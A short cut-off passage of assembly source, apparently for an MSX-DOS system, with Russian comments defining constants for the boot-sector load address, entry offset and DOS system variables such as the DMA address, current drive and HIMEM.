BootPage equ	0C000h		; По адресу Bootpage загружается половина
				; нулевого сектора диска в момент рестарта
StEntry	equ	001Fh		; по адресу Bootpage + StEntry попадает
				; управление после загрузки нулевого сектора
; Адреса системных ячеек DOS

StDMA	equ	0F23Dh		; Адрес данных для подпрограмм дискового обмена
StDrive	equ	0F2E1h		; Номер текущего дисковода
HIMEM	equ	0F34Bh		; Здесь в момент загрузки системы записан
				; адрес свободной памяти: вся память по адресам,
				; меньшим записанного здесь, свободна
BUFFER	equ	0F34Dh		; Адрес одного из буферов ДОСа; длина буфера
